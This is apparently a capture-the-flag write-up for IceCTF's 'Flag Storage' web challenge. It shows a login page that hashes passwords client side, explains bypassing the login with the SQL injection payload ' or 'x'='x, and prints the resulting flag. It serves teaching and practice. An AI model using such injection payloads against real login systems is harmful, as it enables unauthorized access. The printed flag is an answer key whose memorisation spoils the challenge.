---
layout: writeup
title: 'Stage 2 Web: Flag Storage'
level:
difficulty:
points:
categories: []
tags: []
flag: IceCTF{why_would_you_even_do_anything_client_side}
---
## Challenge

What a cheat, I was promised a flag and I can't even log in. Can you get
in for me? flagstorage.vuln.icec.tf. They seem to hash their passwords,
but I think the problem is somehow related to [this][1].

## Solution

We have to bypass the login system using SQL injections, page looks as
follows:

    <!doctype html>
    <html>
    <head>
        <meta charset="utf-8" />
        <title>Log In</title>
        <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/skeleton/2.0.4/skeleton.min.css" />
    </head>
    <body>
        <div class="container">
     <form method="post" action="login.php" id="form">
    <label for="username">Username: </label>
    <input class="u-full-width" type="text" name="username" placeholder="Username" />
    <label for="password">Password: </label>
    <input id="password_plain" class="u-full-width" type="password" name="password_plain" placeholder="Password" />
    <input id="password" type="hidden" name="password"/>
    <input type="submit" value="Log In">
    </form>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jsSHA/2.2.0/sha.js"></script>
    <script>
    $(function(){
        var updatePassword = function(e){
            // hash client side for better security, never leak the pw over the wire
            var sha = new jsSHA("SHA-256", "TEXT");
            sha.update($(this).val());
            $("#password").val(sha.getHash("HEX"));
        };
        $("#password_plain").on("change", updatePassword);
        $("#form").on("submit", updatePassword);
    });
    </script>
    </body>
    </html>
{: .language-html}

The password is hashed client side, so we just disable that script, and
enter `' or 'x'='x` for both username and password to log in and get our
flag:

    Logged in!
    Your flag is: IceCTF{why_would_you_even_do_anything_client_side}

## Flag

    IceCTF{why_would_you_even_do_anything_client_side}



[1]: https://en.wikipedia.org/wiki/SQL_injection
